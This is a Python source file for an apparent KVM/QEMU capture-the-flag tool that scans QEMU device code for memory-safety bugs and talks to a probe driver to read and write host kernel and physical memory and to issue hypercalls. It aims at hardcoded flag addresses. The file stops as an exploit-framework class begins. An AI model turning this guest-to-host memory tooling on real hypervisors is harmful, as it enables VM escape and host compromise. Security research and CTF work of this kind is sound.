#!/usr/bin/env python3
"""
KVM CTF Vulnerability Hunter & Exploiter
Combined Static Analysis + Live Testing + Active Exploitation

Features:
  1. STATIC ANALYSIS: Scan QEMU source for vulnerabilities
  2. LIVE TESTING: Probe running hypervisor
  3. ACTIVE EXPLOITATION: Generate and execute exploits for found vulnerabilities
  4. TARGET HOST MEMORY: Read/write to specific host addresses

Usage:
    # Scan and exploit
    ./hunter_exploit.py --scan virtio-gpu --exploit
    ./hunter_exploit.py --scan-all --exploit --target-addr 0xffffffff826279a8
    
    # Just exploitation
    ./hunter_exploit.py --exploit-device virtio-gpu --target-addr 0x64279a8
    
    # Specific vulnerability types
    ./hunter_exploit.py --exploit-uaf --device virtio-gpu
    ./hunter_exploit.py --exploit-double-free --device uhci
"""

import os
import sys
import json
import struct
import fcntl
import time
import argparse
import re
import ctypes
import subprocess
import shutil
import mmap
from pathlib import Path
from dataclasses import dataclass, asdict, field
from typing import List, Dict, Optional, Tuple, Set
from collections import defaultdict
from enum import Enum

# ============================================================================
# Colors
# ============================================================================
class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; E = '\033[0m'
    BOLD = '\033[1m'

def banner():
    print(f"""{C.R}
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  {C.W}KVM CTF Vulnerability Hunter & Exploiter v3.0{C.R}                 â•‘
â•‘  {C.CY}Static Analysis + Live Testing + Active Exploitation{C.R}         â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  {C.Y}Scan:{C.R}     Find error handlers, UAF, double-free patterns      â•‘
â•‘  {C.Y}Exploit:{C.R}  Generate and execute exploits automatically         â•‘
â•‘  {C.Y}Escape:{C.R}   Guest-to-host memory read/write primitives          â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
{C.E}""")

# ============================================================================
# Inlined KVM Probe Interface (from kvm_probe.py)
# ============================================================================

DEVICE_FILE = "/dev/kvm_probe_dev"
IOCTL_BASE = 0x4000

# Memory read/write
IOCTL_READ_KERNEL_MEM    = IOCTL_BASE + 0x10
IOCTL_READ_PHYSICAL_MEM  = IOCTL_BASE + 0x11
IOCTL_READ_GUEST_MEM     = IOCTL_BASE + 0x12
IOCTL_WRITE_KERNEL_MEM   = IOCTL_BASE + 0x20
IOCTL_WRITE_PHYSICAL_MEM = IOCTL_BASE + 0x21
IOCTL_WRITE_GUEST_MEM    = IOCTL_BASE + 0x22

# Hypercall
IOCTL_HYPERCALL          = IOCTL_BASE + 0x60
IOCTL_HYPERCALL_BATCH    = IOCTL_BASE + 0x61

# Other
IOCTL_GET_KASLR_INFO     = IOCTL_BASE + 0x1A


def is_kernel_virtual_addr(addr: int) -> bool:
    return addr >= 0xffff800000000000 or (0xffffffff80000000 <= addr < 0xffffffffffffffff)


def is_physical_addr(addr: int) -> bool:
    return addr < 0x100000000000 and not is_kernel_virtual_addr(addr)


class MemoryInterface:
    """Unified memory interface to /dev/kvm_probe_dev"""

    def __init__(self, device: str = DEVICE_FILE):
        self.device = device
        try:
            self.fd = os.open(self.device, os.O_RDWR)
        except Exception as e:
            self.fd = None
            raise

    def __del__(self):
        try:
            if hasattr(self, 'fd') and self.fd is not None:
                os.close(self.fd)
        except:
            pass

    def read_phys(self, addr: int, size: int):
        if is_kernel_virtual_addr(addr):
            ioctl = IOCTL_READ_KERNEL_MEM
        else:
            ioctl = IOCTL_READ_PHYSICAL_MEM
        buf = ctypes.create_string_buffer(size)
        req = struct.pack('QQQ', addr, size, ctypes.addressof(buf))
        try:
            fcntl.ioctl(self.fd, ioctl, req)
            return buf.raw
        except Exception:
            return None

    def write_phys(self, addr: int, data: bytes) -> bool:
        if is_kernel_virtual_addr(addr):
            ioctl = IOCTL_WRITE_KERNEL_MEM
        else:
            ioctl = IOCTL_WRITE_PHYSICAL_MEM
        buf = ctypes.create_string_buffer(data)
        req = struct.pack('QQQ', addr, len(data), ctypes.addressof(buf))
        try:
            fcntl.ioctl(self.fd, ioctl, req)
            return True
        except Exception:
            return False

    def read_dword(self, addr: int) -> int:
        data = self.read_phys(addr, 4)
        return struct.unpack('<I', data)[0] if data else 0

    def write_dword(self, addr: int, value: int) -> bool:
        return self.write_phys(addr, struct.pack('<I', value))

    def read_qword(self, addr: int) -> int:
        data = self.read_phys(addr, 8)
        return struct.unpack('<Q', data)[0] if data else 0

    def write_qword(self, addr: int, value: int) -> bool:
        return self.write_phys(addr, struct.pack('<Q', value))

    def hypercall(self, nr: int, a0: int = 0, a1: int = 0, a2: int = 0, a3: int = 0) -> int:
        req = struct.pack('QQQQQQ', nr, a0, a1, a2, a3, 0)
        try:
            result = fcntl.ioctl(self.fd, IOCTL_HYPERCALL, req)
            if isinstance(result, bytes) and len(result) >= 48:
                vals = struct.unpack('QQQQQQ', result)
                return vals[5]
            return 0xffffffffffffffff
        except Exception:
            return 0xffffffffffffffff

    def batch_hypercalls(self):
        req = struct.pack('QQQQ', 0, 0, 0, 0)
        try:
            result = fcntl.ioctl(self.fd, IOCTL_HYPERCALL_BATCH, req)
            if isinstance(result, bytes) and len(result) >= 32:
                r = struct.unpack('QQQQ', result)
                return {100: r[0], 101: r[1], 102: r[2], 103: r[3]}
            return {}
        except Exception:
            return {}

# ============================================================================
# Configuration
# ============================================================================

# Target addresses (configurable)
DEFAULT_TARGET_VIRT = 0xffffffff826279a8
DEFAULT_TARGET_PHYS = 0x64279a8

# CTF flags
WRITE_FLAG_PHYS = 0x64279a8
READ_FLAG_PHYS  = 0x695ee10

# Device path mappings for static analysis
DEVICE_PATHS = {
    'ahci':         ['hw/ide/ahci.c', 'hw/ide/ahci.h', 'hw/ide/ahci-internal.h'],
    'virtio-gpu':   ['hw/display/virtio-gpu*.c'],
    'virtio-scsi':  ['hw/scsi/virtio-scsi*.c'],
    'virtio-net':   ['hw/net/virtio-net.c'],
    'virtio-blk':   ['hw/block/virtio-blk.c'],
    'nvme':         ['hw/nvme/*.c', 'hw/block/nvme*.c'],
    'e1000':        ['hw/net/e1000*.c'],
    'e1000e':       ['hw/net/e1000e*.c'],
    'xhci':         ['hw/usb/hcd-xhci*.c'],
    'ehci':         ['hw/usb/hcd-ehci*.c'],
    'uhci':         ['hw/usb/hcd-uhci.c'],
    'vmware-svga':  ['hw/display/vmware_vga.c'],
    'qxl':          ['hw/display/qxl*.c'],
    'ide':          ['hw/ide/*.c'],
    'floppy':       ['hw/block/fdc*.c'],
    'rtl8139':      ['hw/net/rtl8139.c'],
    'pcnet':        ['hw/net/pcnet*.c'],
    'sdhci':        ['hw/sd/sdhci*.c'],
    'lsi':          ['hw/scsi/lsi53c895a.c'],
    'megasas':      ['hw/scsi/megasas.c'],
    'pvscsi':       ['hw/scsi/vmw_pvscsi.c'],
}

# MMIO regions for live probing
MMIO_REGIONS = {
    'ahci':     (0xfebf0000, 0x2000),
    'ahci_alt': (0xfebd0000, 0x2000),
    'xhci':     (0xfeb00000, 0x4000),
    'nvme':     (0xfeb80000, 0x4000),
    'virtio0':  (0xfebc0000, 0x1000),
    'virtio1':  (0xfebc1000, 0x1000),
}

# Virtio device types
VIRTIO_DEVICES = {
    'virtio-net': 1,
    'virtio-blk': 2,
    'virtio-scsi': 8,
    'virtio-gpu': 16,
}

# ============================================================================
# Data Classes
# ============================================================================

class VulnType(Enum):
    UAF = "use_after_free"
    DOUBLE_FREE = "double_free"
    ERROR_HANDLER = "error_handler"
    UNCHECKED_RETURN = "unchecked_return"

@dataclass
class Finding:
    file: str
    line: int
    risk_score: int
    label: str = ""
    function: str = ""
    operations: Dict = field(default_factory=dict)
    code_snippet: str = ""
    call: str = ""
    type: str = ""
    validation: Optional[Dict] = None
    
    @property
    def vuln_type(self) -> Optional[VulnType]:
        """Get vulnerability type enum"""
        if self.type == "use_after_free":
            return VulnType.UAF
        elif self.type == "double_free":
            return VulnType.DOUBLE_FREE
        elif self.type == "error_handler":
            return VulnType.ERROR_HANDLER
        elif self.type == "unchecked_return":
            return VulnType.UNCHECKED_RETURN
        return None
    
    def to_dict(self) -> Dict:
        """Convert to dict"""
        result = {
            'file': self.file,
            'line': self.line,
            'risk_score': self.risk_score,
        }
        
        if self.label:
            result['label'] = self.label
        if self.operations:
            result['operations'] = self.operations
        if self.code_snippet:
            result['code_snippet'] = self.code_snippet
        if self.function:
            result['function'] = self.function
        if self.call:
            result['call'] = self.call
        if self.type and self.type != "error_handler":
            result['type'] = self.type
        if self.validation:
            result['validation'] = self.validation
            
        return result

@dataclass 
class ScanResult:
    device: str
    files_scanned: int
    findings: List[Finding]
    timestamp: str = ""
    
    def to_dict(self) -> Dict:
        return {
            'device': self.device,
            'files_scanned': self.files_scanned,
            'findings': [f.to_dict() for f in self.findings],
            'timestamp': self.timestamp or time.strftime('%Y-%m-%d %H:%M:%S')
        }
    
    def get_by_type(self, vuln_type: VulnType) -> List[Finding]:
        """Get findings by vulnerability type"""
        return [f for f in self.findings if f.vuln_type == vuln_type]
    
    def get_critical(self) -> List[Finding]:
        """Get critical severity findings (risk >= 80)"""
        return [f for f in self.findings if f.risk_score >= 80]

@dataclass
class ExploitResult:
    """Result of an exploitation attempt"""
    success: bool
    vuln_type: VulnType
    device: str
    finding: Finding
    method: str
    details: str = ""
    leak_addr: int = 0
    wrote_bytes: int = 0
    error: str = ""
    
    def __str__(self):
        status = f"{C.G}SUCCESS{C.E}" if self.success else f"{C.R}FAILED{C.E}"
        s = f"[{status}] {self.device} - {self.vuln_type.value}\n"
        s += f"  Method: {self.method}\n"
        if self.leak_addr:
            s += f"  Leaked: 0x{self.leak_addr:016x}\n"
        if self.wrote_bytes:
            s += f"  Wrote: {self.wrote_bytes} bytes\n"
        if self.details:
            s += f"  {self.details}\n"
        if self.error:
            s += f"  Error: {self.error}\n"
        return s

# ============================================================================
# QEMU Source Finder (same as before)
# ============================================================================

class QEMUFinder:
    """Find or download QEMU source matching the running hypervisor"""
    
    SEARCH_PATHS = [
        '/opt/qemu', '/usr/src/qemu', '/usr/local/src/qemu',
        os.path.expanduser('~/qemu'), os.path.expanduser('~/src/qemu'),
        '/root/qemu', '/home/user/qemu', '/var/lib/qemu',
        '/challenge/qemu', '/opt/challenge/qemu', '/tmp/qemu-src',
    ]
    
    @staticmethod
    def get_running_version() -> Optional[str]:
        """Detect version of running QEMU"""
        methods = [
            lambda: QEMUFinder._run_cmd(['qemu-system-x86_64', '--version']),
            lambda: QEMUFinder._run_cmd(['/usr/sbin/qemu-ga', '-V']),
            lambda: QEMUFinder._run_cmd(['qemu-ga', '-V']),
            lambda: QEMUFinder._get_version_from_proc(),
            lambda: QEMUFinder._run_cmd(['/usr/bin/qemu-system-x86_64', '--version']),
            lambda: QEMUFinder._run_cmd(['/usr/local/bin/qemu-system-x86_64', '--version']),
            lambda: QEMUFinder._get_version_from_package(),
        ]
        
        for method in methods:
            try:
                output = method()
                if output:
                    match = re.search(r'(?:version|Agent)\s+(\d+\.\d+(?:\.\d+)?)', output)
                    if match:
                        return match.group(1)
            except:
                continue
        return None
    
    @staticmethod
    def _get_version_from_package() -> Optional[str]:
        try:
            result = subprocess.run(
                ['dpkg-query', '-W', '-f=${Version}', 'qemu-system-x86'],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0 and result.stdout:
                match = re.search(r':?(\d+\.\d+)', result.stdout)
                if match:
                    return match.group(1)
        except:
            pass
        
        try:
            result = subprocess.run(
                ['rpm', '-q', '--qf', '%{VERSION}', 'qemu-kvm'],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0 and result.stdout:
                return result.stdout.strip()
        except:
            pass
        
        return None
    
    @staticmethod
    def _run_cmd(cmd: List[str]) -> Optional[str]:
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                return result.stdout
        except:
            pass
        return None
    
    @staticmethod
    def _get_version_from_proc() -> Optional[str]:
        try:
            result = subprocess.run(['pgrep', '-a', 'qemu'], capture_output=True, text=True)
            if result.stdout:
                line = result.stdout.split('\n')[0]
                parts = line.split()
                if len(parts) >= 2:
                    binary = parts[1]
                    return QEMUFinder._run_cmd([binary, '--version'])
        except:
            pass
        return None
    
    @staticmethod
    def find_existing_source() -> Optional[Path]:
        print(f"{C.B}[*]{C.E} Searching for existing QEMU source...")
        
        for path_str in QEMUFinder.SEARCH_PATHS:
            path = Path(path_str)
            if QEMUFinder._is_valid_qemu_source(path):
                print(f"{C.G}[+]{C.E} Found QEMU source: {path}")
                return path
        
        search_roots = ['/', '/opt', '/usr/src', '/home', '/root']
        for root in search_roots:
            try:
                root_path = Path(root)
                if not root_path.exists():
                    continue
                for qemu_dir in root_path.glob('**/qemu'):
                    if QEMUFinder._is_valid_qemu_source(qemu_dir):
                        print(f"{C.G}[+]{C.E} Found QEMU source: {qemu_dir}")
                        return qemu_dir
            except (PermissionError, Exception):
                continue
        
        return None
    
    @staticmethod
    def _is_valid_qemu_source(path: Path) -> bool:
        if not path.exists() or not path.is_dir():
            return False
        
        indicators = [
            path / 'hw' / 'ide' / 'ahci.c',
            path / 'hw' / 'block' / 'nvme.c',
            path / 'include' / 'qemu',
            path / 'qemu-options.hx',
            path / 'vl.c',
            path / 'softmmu' / 'vl.c',
            path / 'system' / 'vl.c',
        ]
        
        return any(ind.exists() for ind in indicators)
    
    @staticmethod
    def get_source_version(qemu_path: Path) -> Optional[str]:
        version_file = qemu_path / 'VERSION'
        if version_file.exists():
            try:
                return version_file.read_text().strip()
            except:
                pass
        
        meson_file = qemu_path / 'meson.build'
        if meson_file.exists():
            try:
                content = meson_file.read_text()
                match = re.search(r"version:\s*'(\d+\.\d+(?:\.\d+)?)'", content)
                if match:
                    return match.group(1)
            except:
                pass
        
        return None
    
    @staticmethod
    def download_source(version: str = None, dest: Path = None) -> Optional[Path]:
        if dest is None:
            dest = Path('/tmp/qemu-src')
        
        dest = Path(dest)
        
        if version is None:
            version = QEMUFinder.get_running_version()
            if version:
                print(f"{C.G}[+]{C.E} Detected running QEMU version: {version}")
            else:
                print(f"{C.Y}[!]{C.E} Could not detect QEMU version, will clone latest")
                version = None
        
        if dest.exists() and QEMUFinder._is_valid_qemu_source(dest):
            existing_ver = QEMUFinder.get_source_version(dest)
            if version is None or existing_ver == version:
                print(f"{C.G}[+]{C.E} QEMU source already exists at {dest}")
                return dest
            else:
                print(f"{C.Y}[!]{C.E} Removing old source (version {existing_ver})")
                shutil.rmtree(dest, ignore_errors=True)
        
        print(f"{C.B}[*]{C.E} Downloading QEMU {version or 'latest'} source...")
        
        if shutil.which('git'):
            try:
                dest.parent.mkdir(parents=True, exist_ok=True)
                
                if version:
                    tag = f"v{version}"
                    cmd = [
                        'git', 'clone', '--depth', '1', '--branch', tag,
                        'https://github.com/qemu/qemu.git', str(dest)
                    ]
                    
                    print(f"{C.CY}    Running: {' '.join(cmd)}{C.E}")
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                    
                    if result.returncode == 0:
                        print(f"{C.G}[+]{C.E} Downloaded QEMU {version} to {dest}")
                        return dest
                    else:
                        cmd[5] = version
                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                        if result.returncode == 0:
                            print(f"{C.G}[+]{C.E} Downloaded QEMU {version} to {dest}")
                            return dest
                
                print(f"{C.B}[*]{C.E} Cloning latest QEMU (master)...")
                cmd = [
                    'git', 'clone', '--depth', '1',
                    'https://github.com/qemu/qemu.git', str(dest)
                ]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                if result.returncode == 0:
                    actual_ver = QEMUFinder.get_source_version(dest)
                    print(f"{C.G}[+]{C.E} Downloaded QEMU {actual_ver or 'latest'} to {dest}")
                    return dest
                        
            except subprocess.TimeoutExpired:
                print(f"{C.R}[-]{C.E} Download timed out")
            except Exception as e:
                print(f"{C.R}[-]{C.E} Git clone failed: {e}")
        
        print(f"{C.R}[-]{C.E} Could not download QEMU source")
        return None
    
    @staticmethod
    def find_or_download(version: str = None) -> Optional[Path]:
        existing = QEMUFinder.find_existing_source()
        if existing:
            return existing
        
        print(f"{C.Y}[!]{C.E} No existing QEMU source found")
        return QEMUFinder.download_source(version)

# ============================================================================
# Static Analysis Scanner (same as before but returns structured results)
# ============================================================================

class StaticScanner:
    """Scans QEMU source code for error handling vulnerabilities"""
    
    def __init__(self, qemu_src: Path):
        self.qemu_src = Path(qemu_src)
        if not self.qemu_src.exists():
            raise ValueError(f"QEMU source not found: {qemu_src}")
    
    def find_files(self, device: str) -> List[Path]:
        if device not in DEVICE_PATHS:
            print(f"{C.R}[-]{C.E} Unknown device: {device}")
            print(f"{C.Y}[*]{C.E} Available: {', '.join(sorted(DEVICE_PATHS.keys()))}")
            return []
        
        patterns = DEVICE_PATHS[device]
        files = []
        
        for pattern in patterns:
            if '*' in pattern:
                parts = pattern.split('/')
                search_dir = self.qemu_src / '/'.join(parts[:-1])
                if search_dir.exists():
                    files.extend(search_dir.glob(parts[-1]))
            else:
                fpath = self.qemu_src / pattern
                if fpath.exists():
                    files.append(fpath)
        
        return [f for f in files if f.exists() and f.suffix in ['.c', '.h']]
    
    def scan_file(self, filepath: Path) -> List[Finding]:
        try:
            content = filepath.read_text(encoding='utf-8', errors='ignore')
        except Exception as e:
            print(f"{C.Y}[!]{C.E} Error reading {filepath}: {e}")
            return []
        
        findings = []
        findings.extend(self._find_goto_patterns(content, filepath))
        findings.extend(self._find_unchecked_calls(content, filepath))
        findings.extend(self._find_double_free_patterns(content, filepath))
        findings.extend(self._find_uaf_patterns(content, filepath))
        
        return findings
    
    def _find_goto_patterns(self, content: str, filepath: Path) -> List[Finding]:
        findings = []
        
        error_labels = ['error', 'err', 'fail', 'cleanup', 'out', 'done', 
                       'unmap', 'free', 'release', 'exit', 'abort']
        
        label_pattern = r'^(\w+):\s*$'
        
        for match in re.finditer(label_pattern, content, re.MULTILINE):
            label_name = match.group(1)
            label_pos = match.start()
            
            if not any(err in label_name.lower() for err in error_labels):
                continue
            
            block = self._extract_code_block(content, label_pos)
            operations = self._analyze_operations(block)
            
            if operations['dangerous_count'] > 0:
                line_num = content[:label_pos].count('\n') + 1
                
                findings.append(Finding(
                    file=str(filepath),
                    line=line_num,
                    type="error_handler",
                    label=label_name,
                    operations=operations,
                    code_snippet=block[:500],
                    risk_score=self._calculate_risk_score(operations)
                ))
        
        return findings
    
    def _find_unchecked_calls(self, content: str, filepath: Path) -> List[Finding]:
        findings = []
        
        error_funcs = [
            r'(\w+_init)\s*\(',
            r'(\w+_create)\s*\(',
            r'(\w+_alloc)\s*\(',
            r'(\w+_map)\s*\(',
            r'(dma_memory_\w+)\s*\(',
            r'(pci_\w+)\s*\(',
            r'(qemu_\w+)\s*\(',
            r'(memory_region_init)\s*\(',
            r'(vmstate_register)\s*\(',
            r'(register_savevm)\s*\(',
        ]
        
        for func_pattern in error_funcs:
            for match in re.finditer(func_pattern, content):
                func_name = match.group(1)
                pos = match.start()
                
                context_start = max(0, pos - 100)
                context = content[context_start:pos]
                
                if re.search(r'(?:if\s*\(|=\s*|return\s+|\?\s*)', context[-50:]):
                    continue
                
                if re.search(r'(?:static|void|int|bool)\s+$', context):
                    continue
                
                line_num = content[:pos].count('\n') + 1
                
                call_end = content.find(';', pos)
                if call_end == -1:
                    call_end = pos + 100
                call = content[pos:call_end + 1].strip()
                
                findings.append(Finding(
                    file=str(filepath),
                    line=line_num,
                    type="unchecked_return",
                    function=func_name,
                    call=call[:100],
                    risk_score=70
                ))
        
        return findings
    
    def _find_double_free_patterns(self, content: str, filepath: Path) -> List[Finding]:
        findings = []
        
        free_pattern = r'(?:g_free|free|qemu_vfree|kfree)\s*\(\s*(\w+)\s*\)'
        frees = [(m.group(1), m.start()) for m in re.finditer(free_pattern, content)]
        
        var_frees = {}
        for var, pos in frees:
            if var in var_frees:
                between = content[var_frees[var]:pos]
                has_null_assign = re.search(rf'{var}\s*=\s*NULL', between)
                
                if not has_null_assign:
                    line_num = content[:pos].count('\n') + 1
                    code_start = max(0, pos - 100)
                    code_end = min(len(content), pos + 100)
                    snippet = content[code_start:code_end]
                    
                    findings.append(Finding(
                        file=str(filepath),
                        line=line_num,
                        type="double_free",
                        function=var,
                        risk_score=95,
                        code_snippet=snippet,
                        label=f"Missing NULL assignment after free({var})"
                    ))
            var_frees[var] = pos
        
        return findings
    
    def _find_uaf_patterns(self, content: str, filepath: Path) -> List[Finding]:
        findings = []
        
        free_pattern = r'(?:g_free|free)\s*\(\s*(\w+)\s*\)\s*;'
        
        for match in re.finditer(free_pattern, content):
            var = match.group(1)
            free_pos = match.end()
            
            after = content[free_pos:free_pos + 500]
            
            use_pattern = rf'{var}\s*(?:->|\[)'
            use_match = re.search(use_pattern, after)
            
            if use_match:
                between = after[:use_match.start()]
                if not re.search(rf'{var}\s*=', between):
                    line_num = content[:free_pos + use_match.start()].count('\n') + 1
                    findings.append(Finding(
                        file=str(filepath),
                        line=line_num,
                        type="use_after_free",
                        function=var,
                        risk_score=100,
                        code_snippet=f"Potential UAF: '{var}' used after free"
                    ))
        
        return findings
    
    def _extract_code_block(self, content: str, start_pos: int) -> str:
        remaining = content[start_pos:]
        
        end_match = re.search(r'\n(?:\w+:|^\})', remaining, re.MULTILINE)
        if end_match:
            return remaining[:end_match.start()]
        
        return remaining[:1000]
    
    def _analyze_operations(self, code_block: str) -> Dict:
        ops = {
            'free': len(re.findall(r'(?:g_free|free|kfree|qemu_vfree)\s*\(', code_block)),
            'close': len(re.findall(r'(?:close|fclose|qemu_close)\s*\(', code_block)),
            'unlock': len(re.findall(r'(?:mutex_unlock|qemu_mutex_unlock|spin_unlock)\s*\(', code_block)),
            'destroy': len(re.findall(r'\w+_destroy\s*\(', code_block)),
            'cleanup': len(re.findall(r'\w+_cleanup\s*\(', code_block)),
            'unmap': len(re.findall(r'(?:unmap|dma_memory_unmap|munmap)\s*\(', code_block)),
            'unref': len(re.findall(r'\w+_unref\s*\(', code_block)),
            'put': len(re.findall(r'\w+_put\s*\(', code_block)),
        }
        ops['dangerous_count'] = sum(ops.values())
        return ops
    
    def _calculate_risk_score(self, operations: Dict) -> int:
        score = 0
        
        score += min(operations['dangerous_count'] * 10, 40)
        
        if operations['free'] > 0:
            score += 25
        if operations['unmap'] > 0:
            score += 20
        if operations['destroy'] > 0:
            score += 15
        if operations['free'] > 1:
            score += 15
        
        return min(score, 100)
    
    def scan_device(self, device: str) -> ScanResult:
        print(f"\n{C.M}[*] STATIC ANALYSIS: {device}{C.E}")
        print(f"{C.M}{'='*60}{C.E}")
        
        files = self.find_files(device)
        if not files:
            return ScanResult(device=device, files_scanned=0, findings=[])
        
        print(f"{C.B}[*]{C.E} Scanning {len(files)} file(s)...")
        
        # Try to initialize live validator (POCValidator) and static analyzer for on-the-fly validation
        validator = None
        analyze_finding = None
        try:
            from poc_validator import POCValidator
            try:
                from kvm_probe import MemoryInterface
                mem = MemoryInterface()
                validator = POCValidator(mem, DEFAULT_TARGET_PHYS)
                print(f"{C.G}[+]{C.E} Live validator initialized - will validate findings as discovered")
            except Exception as e:
                print(f"{C.Y}[!]{C.E} Could not initialize MemoryInterface for validator: {e}")
                validator = None
        except Exception:
            validator = None

        # Load the lightweight static validation analyzer if available
        try:
            from validate_vulnerabilities import analyze_finding as analyze_finding
            print(f"{C.G}[+]{C.E} Static analyzer loaded from validate_vulnerabilities")
        except Exception:
            try:
                from test.validate_vulnerabilities import analyze_finding as analyze_finding
                print(f"{C.G}[+]{C.E} Static analyzer loaded from test/validate_vulnerabilities")
            except Exception:
                analyze_finding = None

        all_findings = []
        for fpath in files:
            print(f"  {C.CY}â†’{C.E} {fpath.name}")
            findings = self.scan_file(fpath)

            # Run static and dynamic validation for each finding as it is discovered
            if findings:
                for f in findings:
                    # Ensure validation container
                    if not getattr(f, 'validation', None):
                        f.validation = {}

                    # Static lightweight analysis
                    if analyze_finding:
                        try:
                            try:
                                is_real, risk, reason = analyze_finding(f.to_dict())
                            except TypeError:
                                # Some analyzer implementations expect the raw dict differently
                                is_real, risk, reason = analyze_finding(f.to_dict())
                            f.validation['static'] = {
                                'is_real': bool(is_real),
                                'risk': risk,
                                'reason': reason
                            }
                        except Exception as e:
                            print(f"{C.Y}[!]{C.E} Static analysis error for {f.file}:{f.line}: {e}")

                    # Dynamic POC validation
                    if validator:
                        try:
                            vres = validator.validate_finding(f.to_dict(), device)
                            if vres:
                                f.validation['dynamic'] = vres.to_dict()
                            time.sleep(0.05)
                        except Exception as e:
                            print(f"{C.Y}[!]{C.E} Dynamic validation error for {f.file}:{f.line}: {e}")

            all_findings.extend(findings)
        
        all_findings.sort(key=lambda f: f.risk_score, reverse=True)
        
        print(f"\n{C.G}[+]{C.E} Found {len(all_findings)} potential vulnerabilities")
        
        return ScanResult(
            device=device,
            files_scanned=len(files),
            findings=all_findings,
            timestamp=time.strftime('%Y-%m-%d %H:%M:%S')
        )
    
    def scan_all(self) -> Dict[str, ScanResult]:
        results = {}
        for device in DEVICE_PATHS:
            results[device] = self.scan_device(device)
        return results
    
    def print_report(self, result: ScanResult):
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} VULNERABILITY SCAN REPORT: {result.device}{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        print(f"\nScan Time: {result.timestamp}")
        print(f"Files Scanned: {result.files_scanned}")
        print(f"Findings: {len(result.findings)}")
        
        if not result.findings:
            print(f"\n{C.Y}No vulnerabilities found.{C.E}")
            return
        
        critical = [f for f in result.findings if f.risk_score >= 80]
        high = [f for f in result.findings if 60 <= f.risk_score < 80]
        medium = [f for f in result.findings if 40 <= f.risk_score < 60]
        low = [f for f in result.findings if f.risk_score < 40]
        
        if critical:
            print(f"\n{C.R}ðŸ”´ CRITICAL ({len(critical)}){C.E}")
            print("-" * 70)
            for i, f in enumerate(critical[:10], 1):
                self._print_finding(i, f)
        
        if high:
            print(f"\n{C.Y}ðŸŸ¡ HIGH ({len(high)}){C.E}")
            print("-" * 70)
            for i, f in enumerate(high[:5], 1):
                self._print_finding(i, f)
        
        if medium:
            print(f"\n{C.B}ðŸ”µ MEDIUM ({len(medium)}){C.E}")
            print("-" * 70)
            for i, f in enumerate(medium[:3], 1):
                self._print_finding(i, f)
        
        print(f"\n{C.G}Summary:{C.E} {len(critical)} critical, {len(high)} high, {len(medium)} medium, {len(low)} low")
    
    def _print_finding(self, num: int, f: Finding):
        print(f"\n[{num}] {f.file}:{f.line}")
        print(f"    Type: {f.type}")
        print(f"    Risk: {f.risk_score}/100")
        
        if f.label:
            print(f"    Label: {f.label}")
        if f.function:
            print(f"    Function: {f.function}")
        if f.operations and f.operations.get('dangerous_count', 0) > 0:
            ops = {k: v for k, v in f.operations.items() if v > 0 and k != 'dangerous_count'}
            print(f"    Operations: {ops}")
        if f.code_snippet:
            snippet = f.code_snippet[:200].replace('\n', '\n    ')
            print(f"    Snippet: {snippet}...")

# ============================================================================
# Live Hypervisor Interface
# ============================================================================

class LiveTester:
    """Interface to running hypervisor via kvm_probe_drv"""
    
    def __init__(self):
        self.mem = None
        try:
            self.mem = MemoryInterface()
            print(f"{C.G}[+]{C.E} Connected to {self.mem.device}")
        except Exception as e:
            print(f"{C.R}[-]{C.E} Failed to open probe device: {e}")
            print(f"{C.Y}[!]{C.E} Load driver: sudo insmod kvm_probe_drv.ko")
            self.mem = None
    def close(self):
        if self.mem is not None:
            try:
                del self.mem
            except:
                pass
            self.mem = None
    
    def is_available(self) -> bool:
        return self.mem is not None
    
    def read_phys(self, addr: int, size: int) -> Optional[bytes]:
        """Read from physical memory (auto-detects physical vs kernel virtual)"""
        if not self.is_available():
            return None
        return self.mem.read_phys(addr, size)
    
    def _read_physical(self, addr: int, size: int) -> Optional[bytes]:
        return None
    
    def _read_kernel(self, addr: int, size: int) -> Optional[bytes]:
        return None
    
    def write_phys(self, addr: int, data: bytes) -> bool:
        """Write to memory (auto-detects physical vs kernel virtual)"""
        if not self.is_available():
            return False
        return self.mem.write_phys(addr, data)
    
    def _write_physical(self, addr: int, data: bytes) -> bool:
        return False
    
    def _write_kernel(self, addr: int, data: bytes) -> bool:
        return False
    
    def hypercall(self, nr: int, a0: int = 0, a1: int = 0, a2: int = 0, a3: int = 0) -> int:
        if not self.is_available():
            return 0xffffffffffffffff
        return self.mem.hypercall(nr, a0, a1, a2, a3)
    
    def hypercall_batch(self) -> Dict[int, int]:
        if not self.is_available():
            return {}
        return self.mem.batch_hypercalls()

# ============================================================================
# Exploitation Framework
# ============================================================================

class ExploitFramework:
    """
    Main exploitation framework that generates and executes exploits
    for vulnerabilities found by static analysis
    """
    
    def __init__(self, tester: LiveTester, target_addr: int = DEFAULT_TARGET_PHYS):
        self.tester = tester
        self.target_addr = target_addr
        self.results: List[ExploitResult] = []
        
        # Determine address type
        if is_kernel_virtual_addr(target_addr):
            self.addr_type = "kernel virtual"
        else:
            self.addr_type = "physical"
        
        print(f"{C.CY}[*]{C.E} Target: 0x{target_addr:x} ({self.addr_type})")
        
